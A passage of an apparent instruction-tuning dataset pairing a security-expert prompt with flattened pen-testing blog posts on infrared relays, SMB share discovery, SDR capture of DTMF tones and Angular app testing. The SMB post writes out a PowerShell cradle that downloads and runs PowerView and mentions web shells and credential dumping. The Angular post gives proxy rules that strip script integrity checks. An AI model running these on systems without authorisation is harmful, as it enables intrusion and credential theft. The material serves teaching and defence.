Play Serial.println Play if CH_4 false digitalWrite play LOW close relay ch-4 if CH_4 true digitalWrite play HIGH open relay ch-4 CH_4 !CH_4 break myReceiver.enableIRIn Restart the receiver Typical run of Arduino generic remote button presses Conclusion For me this was an enjoyable project from the very beginning and although Infrared communication has been around for quite some time it's nice to know that we have open source tools available to help us with our research Additionally it was interesting to learn that the Infrared wavelength is just outside of the visible light spectrum and invisible to the naked eye I recently discovered that a team of researchers used this information as a means to exfiltrate and infiltrate proprietary data on an air-gap security camera network rxiv.org abs 1709.05742 Using malware installed internally on the network they managed to establish bi-directional covert communication between the internal network of organizations and remote attackers by controlling pulsating the IR illumination The researchers indicated that they were able to exfil PIN codes passwords and encryption keys at a rate of 20 bits sec and infil data into the network at a rate of 100 bits sec They went on to say that binary data such as command and control C2 and beacon messages were encoded on top of the IR signals Ultimately I found that it was quite easy to configure hardware to harness the power of Infrared and control relays with a push of a button The benefits of Infrared hardware control are practically limitless limited only by the imagination of the hardware designer"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Finding Buried Treasure in Server Message Block (SMB)</title>\n<taxonomies>Author, David Fletcher, Informational</taxonomies>\n<creation_date>Mon, 19 Apr 2021 18:45:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Service Message Block SMB shares can represent a significant risk to an organization Companies often lack a realistic understanding of the exposure that SMB shares represent Effective management typically requires a sound information management program focused on identifying where critical information resides actively controlling access to that information and routinely auditing permissions and access patterns Often when organizations are asked about discovery of sensitive data administrators immediately indicate that mapped network drives are routinely audited for sensitive content and that permissions on those drives are rigorously guarded Unfortunately mapped network drives are typically the tip of the iceberg when it comes to content exposure on any given network In this post we will walk through one method to identify potentially sensitive content exposure via SMB shares at scale At the end of the post strategies for reducing the amount of exposure present in an environment will be presented Content Discovery at Scale A favorite tool for SMB enumeration is the PowerSploit PowerView script It has been ported to other languages and much of its functionality serves as the basis for the BloodHound project Two functions are most valuable for performing discovery on a Windows Active Directory AD network The first Get-NetComputer is used to collect target computer names so we can create triage lists for analysis of our network shares The second Invoke-ShareFinder actually does the enumeration for us dutifully asking each computer for a list of shares and checking to see if our selected user has access When performing this activity it is useful to start with a user account that is a member of the 'Domain Users group only This will reduce the false positive rate on share exposure and identify the most egregious cases where the share is exposed to everyone on the domain After identifying and mitigating worst cases additional group memberships can be added to simulate what information is exposed to a typical user Triage Computer List Creation When assessing share content I normally generate triage computer lists so I know exactly what I am looking at what potential value it has for attack and so I can potentially avoid pitfalls like honeypots that have incomplete Active Directory attribute information This strategy also works from a defensive perspective Generally in modern Windows networks more content is shared on data center resources than on workstation segments enumeration of the data center resources may not appear anomalous and older operating systems like Windows Server 2003 Windows Server 2008 and Windows Server 2012 RTM represent increased risk to the environment As an example all of these operating systems have one characteristic in common WDigest is enabled and that means potential for cleartext credentials in memory Other issues like lack of support from Microsoft Windows Server 2003 and Windows Server 2008 and age in the environment it may be easier to escalate privileges due to configuration drift also make them attractive from an attack perspective As a defender it is probably a good idea to address these hosts first To a lesser extent the issues described above also exist in the workstation segment However we generally find administrative access in those environments more than sensitive content Obviously that is not a hard and fast rule as one environment can differ significantly from another In order to generate the triage lists described above we need to get our hands on PowerSploit PowerView or SharpView Commands shown below are for PowerView 2.0 but they can be adapted to work with PowerView 3.0 and SharpView I personally prefer PowerView 2.0 syntax but similar analysis can be accomplished using Get-DomainComputer and Find-DomainShare in PowerView 3.0 You may need to create an exception in your endpoint suite or Endpoint Detection and Response EDR tool for retrieval and execution to be successful The script can be retrieved using a PowerShell download cradle downloaded directly to disk or copied and pasted in raw form into the PowerShell interpreter window or PowerShell Integrated Scripting Environment ISE The following commands will generate triage lists for all typical Windows operating systems Remove the ones that do not exist in your environment PS C iex iwr aw.githubusercontent.com PowerShellEmpire PowerTools master PowerView powerview.ps1 -usebasicparsing PS C Get-NetComputer OperatingSystem 2003 Out-File Encoding ASCII Windows2003Hosts.txt PS C Get-NetComputer OperatingSystem 2008 Out-File Encoding ASCII Windows2008Hosts.txt PS C Get-NetComputer OperatingSystem 2012 Out-File Encoding ASCII Windows2012Hosts.txt PS C Get-NetComputer OperatingSystem 2016 Out-File Encoding ASCII Windows2016Hosts.txt PS C Get-NetComputer OperatingSystem 2019 Out-File Encoding ASCII Windows2019Hosts.txt PS C Get-NetComputer OperatingSystem XP Out-File Encoding ASCII WindowsXPHosts.txt PS C Get-NetComputer OperatingSystem 7 Out-File Encoding ASCII Windows7Hosts.txt PS C Get-NetComputer OperatingSystem 8 Out-File Encoding ASCII Windows8Hosts.txt PS C Get-NetComputer OperatingSystem 10 Out-File Encoding ASCII Windows10Hosts.txt If you have poor Active Directory hygiene computer accounts exist for devices that no longer exist it can be useful to also filter on the pwdLastSet attribute to remove devices with a high likelihood of being unresponsive By default in Active Directory computers reset the password associated with their account every 30 days Usually I provide a grace period of about 6 months in customer environments for devices Typically this is not necessary unless you aim to try to avoid detection Full enumeration is also likely to produce complete results unless a device is turned off at the time of the activity Share Enumeration Next the triage lists generated above are used as input for the Invoke-ShareFinder function Invoke-ShareFinder simply requests a share listing from each asset in the list and as we will configure it will check to see if the identity we are using has access to the exposed shares Commands for each triage list are shown below The only variations are the actual input list and output file name PS C Invoke-ShareFinder ComputerFile Windows2003Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows2003Shares.txt PS C Invoke-ShareFinder ComputerFile Windows2008Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows2008Shares.txt PS C Invoke-ShareFinder ComputerFile Windows2012Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows2012Shares.txt PS C Invoke-ShareFinder ComputerFile Windows2016Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows2016Shares.txt PS C Invoke-ShareFinder ComputerFile Windows2019Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows2019Shares.txt PS C Invoke-ShareFinder ComputerFile WindowsXPHosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII WindowsXPShares.txt PS C Invoke-ShareFinder ComputerFile Windows7Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows7Shares.txt PS C Invoke-ShareFinder ComputerFile Windows8Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows8Shares.txt PS C Invoke-ShareFinder ComputerFile Windows10Hosts.txt -NoPing ExcludeIPC ExcludePrint CheckShareAccess Out-File Encoding ASCII Windows10Shares.txt If you have a large environment the above commands can be executed faster by adding the 'threads parameter to the Invoke-ShareFinder portion of the command Doing so allows the script to evaluate the elements of the computer listing in parallel fashion The resulting output files generated above will serve as the source for our sensitive content discovery operation described in the next section Sensitive Content Discovery With our share lists generated it's time to find that buried treasure On a test I would typically generate a single list at a time and search through the results individually to identify what a group of hosts running the same operating system might expose However for defensive purposes it is useful to investigate the shares at scale This can be most effectively accomplished using a tool that understands regular expressions and multi-file searching Some of my favorite searches are demonstrated below using the Notepad text editor Similar analysis can be accomplished in Linux using the cat sort and grep utilities First select all of the files containing share information right click and select Edit with Notepad With all of the files open simultaneously we will investigate some common exposures that pose risk to the organization It's likely that in a given environment many more cases will be present However the analysis below simply serves to illustrate latent risk due to SMB share exposure Administrative Access Probably the most notorious and useful shares that can be exposed in the context of an attack are the C and Admin shares Discovery of these shares means that administrative access is extremely likely To discover these shares we can use the normal mode search feature in Notepad as shown below Select the Search Find menu option or Ctrl F to display this dialog Enter the text Admin in the search bar select the normal search mode and click the Find All in All Opened Documents button The Notepad search results pane will identify all discovered instances across the group of open files This situation can be a windfall for an attacker Credential dumping via the registry or LSASS process may be possible Deployment Shares Another favorite target is deployment shares System Center Configuration Manager SCCM Windows Deployment Services WDS and the Microsoft Deployment Toolkit MDT are used to deploy new operating systems on the network in an automated fashion With the Find dialog open enter the keyword 'REMINST using normal search mode and click the Find All in All Opened Documents button When folders in the shares exposed on these hosts are poorly protected unattend.xml files and Windows Image .wim files may be accessible Analysis on these resources often lead to discovery of valid local or domain credentials Root Filesystem Shares Administrators may share an entire drive on a given host When this occurs all of the accessible content on the drive is exposed to anyone with access to the share Typically the only locations that have significant restrictions with regard to read access are the subfolders of the 'C Users directory By default the system folder C Windows program files and any other folders created in the root folder C can be inspected With the Find dialog open enter the regular expression a-zA-Z using regular expression search mode and click the Find All in All Opened Documents button The regular expression above matches text that includes a backslash two backslashes are used to escape the sequence followed by a single letter the text within the brackets is a character class definition set to match lower and upper-case alpha characters followed by a space All of the shares listed in the search results are worth investigation Older operating systems might have exposed unattend.xml files with credentials in them and root shares on servers might have very interesting content In the above why would a domain controller SQL server IT utility server and file server containing home directories have the root of a drive shared out Configuration files scripts and other content in these locations are likely to expose credentials Application Web Root Shares Application developers often use SMB shares to publish changes to projects across the network When those shares are not properly restricted users on the network have access to browse source code of the application at a minimum With the Find dialog open enter the regular expression 'inetpub wwwr web using regular expression search mode and click the Find All in All Opened Documents button The regular expression above serves as a multiple keyword search operation with the selected keywords separated by the pipe character notice no spaces between Shares that include custom application or web application source code are a serious issue Where read access is possible an attacker can investigate source code for programming issues check configuration files for credentials and is likely to have SQL access somewhere on the network as a result Where write access is possible the situation gets much worse If project files and source code are staged on the target share an attacker can embed malicious code in the project file or source code of the application When the project gets built or executed the attacker gains access to the hosting server or wherever the project is being built On an application server the attacker can also deploy malicious functionality embedded in or disguised as legitimate functionality of the application The Laudanum project is still one of my favorite web shells and is useful for executing commands in the context of the web application service account Backup Shares Backup shares are commonly observed in a target environment Sometimes these shares are found to expose full digital backup storage However more commonly the shares appear to be used by administrators to migrate databases and other resources to new platforms For this share we return to normal search mode enter the keyword 'Backup and click the Find All in All Opened Documents button Backup shares can contain exceptionally dangerous content Typically in my experience most of these shares contain backups for common SQL server implementations However on occasion we discover some extremely interesting content The share on the 'VMWare host is likely to contain Virtual Machine Disk VMDK files potentially including those for domain controllers VMDK files can be analyzed with tools like 7-zip without the need to actually install the software on a host Even if the VMDK file for a domain controller is several years old it is likely to include many valid and useful credentials Consider the following questions as evidence that useful credentials would exist Have you ever rotated passwords on the krbtgt account in your domain s How old is the password on your oldest service account Are there any LM hashes still present in the Active Directory database Believe it or not we have found and exploited these conditions on several engagements Treasures Abound The conditions presented above are only the tip of the iceberg In your own environment I'm sure that other opportunities will present themselves Off the top of my head I can think of a dozen additional searches that I like to conduct However the point of the exercise is not to comprehensively identify all the bad things we can find on SMB shares It's to get you thinking about what is being shared on your network and strategies you can used to mitigate the associated risk Mitigation Strategies Share Minimization Administrators should review the list of shares to determine whether any given SMB share is necessary and appropriate given the context of the observed access Any shares found to be unneeded should be disabled Remaining shares should have permissions adjusted to address principle of least privilege and need to know requirements Permission Adjustment SMB shares incorporate two sets of permissions The first is the actual NTFS permissions applied to the shared folder The second are the share permissions assigned to the share itself When a user browses to an SMB share the server applies the most restrictive intersection of those two sets of permissions Where NTFS permissions are concerned when an administrator does not make deliberate changes the local 'Users group on the system will have read access to all volumes By default on domain joined computers the 'Domain Users group is a member of the local 'Users group This means that any authenticated user can read the filesystem in a volume where those permissions are not changed With share permissions unless the administrator explicitly creates the share and assigns a domain group as having permission to access the share the default permissions are for the 'Everyone group to have read access As you can probably already tell shares created with default conditions in both cases will typically allow any authenticated member of the 'Domain Users group to read content on the share The second strategy is to correct these permissions across the breadth of shares identified by our earlier work This can be a monumental undertaking depending on the scope and scale of the network under consideration Segmentation Segmentation is simply subdividing the target network into more manageable and functional chunks to ease the burden of administration A segmentation project should always have the principal of least privilege and need to know or access concepts in mind during the design phase The end goal is to create choke points on the network where only authorized individuals or computers and protocols are able to pass between network segments based on a functional need As such true segmentation always implies that appropriate Access Control Lists ACLs are implemented between segments On user segments this strategy should be taken a step further to prevent workstation to workstation communication On a Windows Active Directory AD network workstation to workstation communication should be considered anomalous Often an attacker can exploit lateral communication within a workstation segment to accumulate privileges on route to full environmental takeover By preventing this communication the attacker is forced to directly attack data center or other accessible elements of the network In addition the user segment should have the minimum access necessary into the data center or other protected segments and no more Standard user workstations should not be able to directly access critical resources on the network using unauthorized protocols For example a standard user workstation should not be able to initiate an RDP session to a server especially a Domain Controller Web management consoles like VSphere VEEAM and other core services should equally not be accessible Administrators should have a dedicated workspace for their administrative accounts physical workstation jump host VDI that has no access to email or the internet The administrative network segment should allow access to necessary resources that are restricted on workstation segments Implementation of the general guidelines above would make access to superfluous network shares impossible from the user workstation segment Many options for effective segmentation exist including Network-based firewalls Host-based firewalls Network infrastructure A simplified diagram of illustrating the described conditions is shown below User and Entity Behavioral Analytics UEBA UEBA does not directly mitigate exposure associated with SMB shares like the previous examples However it can be used to proactively identify when user activity deviates from an established baseline When a significant deviation occurs an alert is generated to the information security team so an investigation into the activity can be initiated A significant deviation is often defined in terms of thresholds in the UEBA platform In our case if a user interacts with computers or browses to more than 30 shares that have not been observed in the past 30 days the alert condition is tripped UEBA is not foolproof An attacker with persistent access may be able to fly below the radar by slowly expanding the population of hosts or shares that appear normal to the UEBA solution The attacker would likely need evidence that UEBA is in place to take this action The attacker can also perform manual analysis to identify hosts that might be more valuable for sensitive data discovery Contextual clues often appear in hostnames groups assigned to users descriptions on objects in Active Directory and other locations that will aid the attacker in formulating a pecking order for resource analysis in the environment Additional Assurance After you have taken steps to eliminate unnecessary SMB shares in your environment you might want some additional assurance that sensitive content is no longer exposed to unauthorized parties One of our favorite tools for discovery of arbitrary sensitive content is Snaffler Snaffler is capable of interrogating Active Directory to identify computer accounts enumerating SMB shares on accessible hosts and scouring those hosts for configurable file contents on the exposed share Once you have built configuration files to support your search scenarios the tool can be used to periodically audit the environment for new sensitive data exposure Runtime is directly correlated with the number and depth of shares exposed So ensure that you use one or more of the recommended share minimization steps above before attempting discovery at scale Conclusion Organizations cannot afford to wait on an attacker to expose the sensitive content that exists within their own environments It is in their own best interests to take a proactive stance and eliminate the risk associated with content discovery In most cases the information discovered on non-standard shares should not be exposed in the first place and can provide an easier path to environmental compromise than typical Active Directory attack paths On many occasions we have found ourselves with administrative access to critical resources as a direct result of content discovery Now go out and find the treasure that is hiding in your own environment"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Information From Thin Air: Using SDR to Extract DTMF from Radio Waves</title>\n<taxonomies>Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch</taxonomies>\n<creation_date>Tue, 04 May 2021 12:54:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Disclaimer When using an FM transmitter do not modify the intended operation of the module by amplifying the transmitted signal Also be sure that attaching an FM high gain antenna will NOT be transmitting outside the legal range for RF emissions When transmitting any data be sure you do not accidentally break any laws by illegally transmitting on regulated frequencies Additionally intercepting and decrypting someone else's data is illegal so be careful when researching your traffic n.wikipedia.org wiki ISM_radio_band Introduction Recently I and a few colleagues were asked to put together a hardware lab for an upcoming Infosec conference After some consideration it was decided that the lab should be centered around introducing Software Defined Radio SDR and some of the tools available for forensic analysis of radio frequency RF signals It was also suggested that it would be beneficial to provide attendees with the hardware that we used in our lab This would allow them to revisit the lab in the comfort of their homes as well as use the hardware for future SDR labs and events The intent here is to expose the reader to the exciting world of RF radio frequency wireless technologies and to provide the various tools and information to get started exploring some of the great many invisible wireless signals surrounding us everywhere we go Preparation for the SDR lab Hardware requirements Software Defined Radio dongle FM transmitter module ww.amazon.com gp product B08PVBZB8F Audio MP3 Player module ww.cytron.io c-breakout-board p-standalone-usb-mp3-player-decoder-module Micro-SD any size A good starter SDR software defined radio device is the RTL2832U v3 ww.amazon.com RTL-SDR-Blog-RTL2832U-Software-Defined dp B0129EBDS2 This inexpensive 25 30 SDR device can be tuned from 500 kHz to 1.7 GHz and has up to 3.2 MHz of instantaneous bandwidth 2.4 MHz stable This is a receive-only USB dongle cannot transmit Another inexpensive option is the NooElec-NESDR-Nano 2 ww.amazon.com NooElec-NESDR-Nano-Ultra-Low-Compatible dp B01B4L48QU The more expensive yet still affordable SDR device of choice is unquestionably the HackRF One from Great Scott Gadgets ackerwarehouse.com ww.amazon.com HackRF-Software-Defined-ANT500-Antenna dp B01H3T2U7G This device can be tuned from 1 MHz to 6 GHz is a half-duplex transceiver achieves up to 20 million samples per second using 8-bit quadrature samples 8-bit I and 8-bit Q and is compatible with open-source GNU Radio SDR and more Also the HackRF is software-configurable RX and TX gain and baseband filter Hardware setup Software requirements Gqrx is an open-source software defined radio SDR receiver with hardware support for RTL-SDR Airspy HackRF BladeRF USRP etc and can operate as an AM FM SSB receiver with audio output or as an FFT-only instrument Gqrx is distributed as a source code package and binaries for Linux and Mac however many Linux distributions provide gqrx in their package repositories Extracted from csete gqrx github Gqrx Install gqrx Linux Mac ithub.com csete gqrx optionally Install SDR Sharp Windows only irspy.com download Audacity ww.audacityteam.org download Audacity is a free open-source application you can use for recording editing and mixing audio FFmpeg fmpeg.org download.html FFmpeg is a program designed for command-line-based processing of video and audio files available on all platforms Scope of the lab For this lab we will be transmitting DTMF dual-tone multi-frequency tones over the air and capturing these signals using an SDR dongle and gqrx application These distinctive tones represent the buttons pressed on the older landline telephones and should be very recognizable To continue with our analysis of DTMF we need a better understanding of what we are looking for or listening to Analyzing the DTMF sequence The E.161 standard is an ITU-T International Telecommunications Union recommendation that defines the arrangement of digits letters and symbols on telephone keypads and rotary dials Button presses result in a combination of two specific frequencies generated for gaining access to a telephone network For example pressing 5 on the dial pad results in the combination of a 1.336KHz column and 770Hz row multi-frequency tone burst Prior to smartphones texting was accomplished by tapping the number keys on the dial pad of the phone Tapping the 2 key one time produced the letter A tapping the 2 key twice in succession produced the letter B and so on Generate an audio file for transmission For purpose of this demonstration we will encode the plain text sample to a sequence of DTMF tones Following the older convention of SMS texting we would tap 7777 2 6 7 555 33 on the keypad We can use an online site to generate a WAV format audio file of the sequence of DTMF tones based upon the plain text sample ww.audiocheck.net audiocheck_dtmf.php For the sake of clarity we will rename this file SAMPLE-dtmf.wav We can verify the contents of this WAV file using a multi-platform tool 'multimon-ng successor of multimon This is an awesome tool that supports many different demodulators git clone ithub.com EliasOenal multimon-ng.git cd multimon-ng mkdir build cd build cmake make sudo make install Execute multimon-ng -t wav -a DTMF SAMPLE-dtmf.wav Alternatively we can also use this open-source Linux tool to do the same git clone ithub.com ribt dtmf-decoder.git cd dtmf-decoder sudo python3 -m pip install -r requirements.txt --upgrade chmod x dtmf.py sudo cp dtmf.py usr local bin dtmf Execute dtmf SAMPLE-dtmf.wav Now that we have created the audio file that we intend to transmit over the air we need to store it on a micro-SD card This card will be inserted in our audio player and played in an endless loop for transmission Prepare the micro-SD for the audio player General information Following the lead of a few Arduino project authors it appears the standard for placing files on the micro-SD is to use the following naming convention for folders and files Folders 001 099 Files 0001.mp3 0255.mp3 Rename the SAMPLE-dtmf.mp3 created earlier to 0001.mp3 and copy it the micro-SD in a folder named 001 Note I also created a short 2-second audio file of silence 0002.mp3 to provide a short delay between sequences while looping on the main audio file during testing You can record a short empty audio file using your favorite audio recorder and rename the file 0002.mp3 Copy the 0002.mp3 to the same folder as the 0001.mp3 file Hardware Lab Setup Insert the micro-SD card into the Cytron Audio player module Connect the Audio player line-out to the FM Transmitter module line-in with a 3.5mm stereo audio cable Connect both modules to a USB power source and power up both modules Select the desired frequency to transmit on preferably a quiet section of the FM spectrum to avoid interference from nearby radio stations At this point we are now transmitting our DTMF audio signal over the air at the specified frequency indicated on the FM transmitter's display Note You could verify the audio file is being transmitted on the selected frequency using any FM radio tuned to that frequency Gqrx We will be using a software defined radio application gqrx to capture these DTMF tones and save the resultant demodulated signal to a WAV file for later analysis Insert SDR dongle into an available USB slot on the PC for this demo it is assumed we are using an RTL-SDR dongle Run gqrx -e using the -e flag allows you to select rtl-sdr device Adjust a few gqrx settings Select the 'Receiver Options tab and set the desired receive frequency this is the frequency that your FM transmitter module is transmitting on Also set the Mode to WFM stereo wide FM stereo Additional information In radio engineering a frequency offset Receiver Options top right corner of display is an intentional slight shift of broadcast radio frequency RF to reduce interference with other transmitters This setting can vary depending upon local RF traffic interference and can be adjusted accordingly Ensure the FM transmitter and audio modules are running and click the play button in gqrx to begin receiving radio frequency signals You may see many nearby signals depending upon your location and the number of radio stations broadcasting in your area For fun you can play around with the receive frequency value and try tuning in to your favorite music station Just be sure to return to the FM transmitter module frequency to continue with the lab Upon clicking Play you will immediately observe the 'waterfall real-time visualization of the demodulated signal containing the audio information In the case of an FM music station's broadcast the audio will of course be music DJ's narration commercial advertising etc Regarding our hardware lab the audio will be DTMF tones Gqrx also provides the capability to record the demodulated audio signal and save it to a file for later playback and analysis This is accomplished by first selecting the Input Controls tab With the waterfall running Play mode click on the REC button to begin recording When you reach the end of your desired capture simply click REC again to stop recording Shut off the FM transmitter Audio module hardware The waterfall should stop displaying the audio transmission In the Input Controls tab click Play The recorded audio WAV file will play and can be heard through the PC's sound port Notice the WAV file is saved logging the date time and received frequency as part of the filename If we open the saved gqrx WAV file in Audacity and zoom in we can see the distinctive multi-frequency components of the DTMF bursts Finally we can verify our over-the-air capture of the DTMF sequence matches the transmitted audio file we generated earlier using 'multimon-ng Execute multimon-ng -t wav -a DTMF gqrx_20210423_200028_89100000.wav Synopsis Using the FM transmitter and audio sound module presented in this post allowed us to simulate signals that would normally have existed outside the FM spectrum Transmitting the signal using FM radio waves allows us to experiment with software defined radio tools in a controlled environment Using the free and open-source tools mentioned in this write-up and the appropriate SDR hardware analyzing demodulated signals such as FM frequency modulated radio AM amplitude modulated signals DTMF signals SSB single sideband LSB lower sideband USB upper sideband Bluetooth communication garage door opener and doorbell RF frequencies amateur ham radio frequencies satellite radio and video etc are entirely possible In the future we intend on creating more virtual hardware labs that use the hardware presented in this write-up to capture and analyze other wireless RF protocols Ideally we hope to be able to provide links that allow the reader to download pre-configured WAV MP3 files which can then be saved to the reader's micro-SD for localized transmission over the air I am looking forward to being involved with this innovative and promising project"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Web App Pen Testing in an Angular Context</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Joff Thyer, Web App, Joff Thyer</taxonomies>\n<creation_date>Thu, 06 May 2021 13:01:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer If you are a fan of web application pen testing you have been spoiled with a lot of easy pickings over the years We all love our interception proxies and I know a lot of us are huge fans of the great work that PortSwigger has done with Burp Suite over the years Having said this testing apps in the age of modern web applications that have Document Object Model DOM focused frameworks is a little bit different than testing a traditional HTML-based app For the remainder of this blog post please make the assumption that I am referring to Angular versions 2 and up which are object-oriented and based on ECMAScript version 6 ES6 or ECMAScript 2015 Angular version 1.x previously known as AngularJS is deprecated and less likely to be encountered although not dead yet Having said this don't panic and don't abandon your normal web app penetration testing techniques What you need to understand is that in the world of Angular 2 which is designed with security in mind from the ground up your normal opportunities specifically for injecting JavaScript into the DOM are severely limited if the developer uses the defaults and common best practices We should celebrate that things are moving in the right direction with modern frameworks whereby developers don't have to continually reinvent the wheel Here are a few references with some great background for you log.nvisium.com angular-for-pentesters-part-1 log.nvisium.com angular-for-pentesters-part-2 ngular.io guide security There are mistakes that developers can make which render an Angular application vulnerable from the DOM perspective These mistakes largely boil down to developers deliberately working around the safeguards that the framework puts in place Examples would be as follows If a developer combines user input with the creation of a template then that user input can directly impact the DOM rendering leading to a template injection vulnerability Angular considers templates as trusted by default If a developer decides to mark user input as trusted and disables the extremely effective Angular sanitization and output encoding methods then you are back to the bad old days of potential Cross-Site Scripting being introduced As a rule any Angular interpolated content is always escaped Direct use of the DOM APIs is discouraged There is probably an Angular method for everything you need to do If not there is an Angular DomSanitize function if you just have to muck around where you really should not From an attacker perspective a pretty sizable part of the attack surface has been removed if the developer follows the best practices There are however opportunities to discover Some thoughts are as follows The backend of the application will most likely be JSON RESTful-based API calls Mistakes in proper server-side data validation are possible Insecure Direct Object References IDOR are discoverable in API's and you should always request multiple authenticated accounts for testing to examine cross-user role incursions Session management still needs to be properly implemented It is not unusual to see JSON Web Tokens JWTs used for session management in Angular-based apps The session token might not be properly invalidated upon logout might be long-lived or token invalidation upon log out completely in the control of the client-side DOM The JWT might be able to be re-signed with a None value as the signature algorithm creating an unsecured token or the signing key itself might be able to be cracked Signing your own application JWT could lead to other authenticated user compromise For a couple of quick JWT references visit these URLs wt.io n.wikipedia.org wiki JSON_Web_Token Undocumented or debugging API functionality might be discovered through changing a value in the browser DOM If a developer decides to implement Server-Side Rendering SSR rather than the normal DOM heavy Client-Side Rendering CSR it is possible to reintroduce JavaScript injection opportunities The Angular project is trying to get ahead of this by introducing Angular Universal Here are a couple of references for you ngular.io guide universal evelopers.google.com web updates 2019 02 rendering-on-the-web When pen testing an Angular app one of the results of the technology shift is that you will likely spend more time in the browser developer console as well as your interception proxy Angular 2 has a feature in the form of a special function called enableProdMode which is called right after the framework is bootstrapped in the DOM This assumes that the developers have indeed deployed the application in production mode The enableProdMode function makes Angular skip building the debugging elements tree in the browser This debugging elements tree is useful to you as a penetration tester as you can use the Angular ng.probe function to examine page elements after selecting that element on a page In production mode ng.probe for a page component will return a null value which is not useful One of the early things you want to do is modify this function in flight in your interception proxy so it fails to enable production mode There is one slight twist on this If the application is also deployed with ebpack.js.org then it is possible that the function name is obfuscated Fortunately there is a string within the function that reads Cannot enable prod mode after platform setup which you can use to find the obfuscated function name If you are using Burp Suite here is a way you can configure the proxy to rewrite the function in flight This example assumes that webpack has not been used to obfuscate function names The steps are as follows Select the Proxy tab in Burp Suite Select the Proxy Options sub-tab Scroll down to the Match Replace section and remove any existing rules Click Add to add a new rule Select Response Body as the type Match the string function enableProdMode Add in a replacement string that adds _devMode 1 and returns from the function When this is done it is important to be careful to preserve script syntax integrity so that you don't completely break functionality Burp Suite Match Replace Rules Rule to Rewrite the enableProdMode Function Debugger Console Output After Reloading the Page There is another snag you might run into which will force you into adding another match replace rule I learned this one the hard way of course like so many things Since 2016 some HTML included source tags have an integrity option which is actually a pretty nice feature In short the integrity tag allows the developer to specify a hash algorithm and a base64 encoded hash The browser will attempt to validate the hash and will not execute the JavaScript if the hash does not match A related defense in-depth technique is to leverage Content Security Policy CSP CSP is a whitelisting technique that allows web server administrators to specify the domains that browsers should be considered as valid sources of executable scripts For browsers that support CSP this technique further helps mitigate Cross-Site Scripting and data injection attacks CSP is implemented with an HTTP header added to server responses Browsers that don't support CSP will fall back to the normal same-origin policy model For more information please refer to eveloper.mozilla.org en-US docs Web HTTP CSP As you might imagine rewriting a JavaScript function in flight will certainly violate the integrity tag check if it is present A second match replace rule similar to the below screenshot will remediate this roadblock for you to continue testing Example Response Body Rule to Remove the integrity Tag After putting this into place and reloading your Angular app contents you can select any page element and probe its state using ng.probe in the developer tools console and then even create an instance of the JavaScript object to begin your exploration From here you can manipulate attributes of that object to see what impact it has What you try to do is only limited by your creativity and time constraints An example of using this probe technique is shown below Sample Debugger Console Output That's about all I have for you now Happy web app testing trails and keep right on hacking"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Using SDR to Build a Trunk Tracker - Police, Fire, and EMS Scanner</title>\n<taxonomies>Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch</taxonomies>\n<creation_date>Mon, 17 May 2021 17:46:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
